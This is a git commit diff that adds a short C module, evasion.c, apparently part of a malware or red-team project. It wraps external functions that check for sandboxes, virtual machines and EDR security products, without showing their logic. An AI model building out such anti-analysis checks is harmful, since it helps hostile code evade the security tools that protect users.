9762564fbc1370ef7860e4b35662a97799f23f71
Xorganic.exe <66781492+xorganic@users.noreply.github.com>
2024-11-03 05:46:15 +0200

    Update evasion.c

--- modules/evasion.c
+++ modules/evasion.c
@@ -1,1 +1,23 @@
+// evasion.c
+#include "evasion.h"
+#include "utils.h"
+
+extern int detect_sandbox();
+extern int detect_vm();
+extern int detect_edr();
+
+int is_sandbox_detected() {
+    log_event("Checking for sandbox...");
+    return detect_sandbox();
+}
+
+int is_vm_detected() {
+    log_event("Checking for virtual machine...");
+    return detect_vm();
+}
+
+int is_edr_detected() {
+    log_event("Checking for EDR presence...");
+    return detect_edr();
+}
 
